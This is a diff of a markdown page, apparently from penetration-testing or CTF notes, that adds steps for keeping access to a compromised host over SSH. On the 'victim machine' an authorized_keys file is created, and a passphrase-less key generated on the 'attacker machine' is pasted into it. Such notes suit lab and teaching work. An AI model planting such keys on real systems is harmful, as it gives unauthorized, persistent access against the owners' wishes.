@@ -7,19 +7,53 @@ sort : 1
 
 ## SSH 
 
-1. Password Reuse Misconfiguration OR Private Key Leakage : 
+### Password Reuse Misconfiguration OR Private Key Leakage : 
 
 ```bash
 $ ssh Username@Host
     password : ******* 
 
-$ ssh -i PrivateKey Username@Host 
+$ ssh -i PrivateKey Username@Host
 ```
 
 
-2. Connecting Via SSH is Better ?
+### Connecting Via SSH is Better ? (.ssh)
 
-So if you got a shell as a user, and you were able to create `.ssh` directory (if it's not already there)
+```bash
+# On the victim machine
+
+$ mkdir ".ssh"; cd .ssh ; touch authorized_keys
+```
+
+```bash
+# On the attacker machine
+
+$ cd /tmp; ssh-keygen  
+
+# Generating public/private rsa key pair.
+Enter file in which to save the key (/home/o54ma/.ssh/id_rsa): TmpKey # file name to save the key 
+Enter passphrase (empty for no passphrase): 						  # no password 
+Enter same passphrase again: 								          # no password 
+
+
+$ cat TmpKey.pub | xclip -selection c                                 # copy the public key
+
+```
+
+```bash
+# Back on the victim machine
+
+$ echo "`CTRL+V`" >> authorized_keys
+```
+
+```bash
+# Back on the attacker machine
+
+ssh -i TmpKey Username@Host
+```
+
+
+
 
 
 
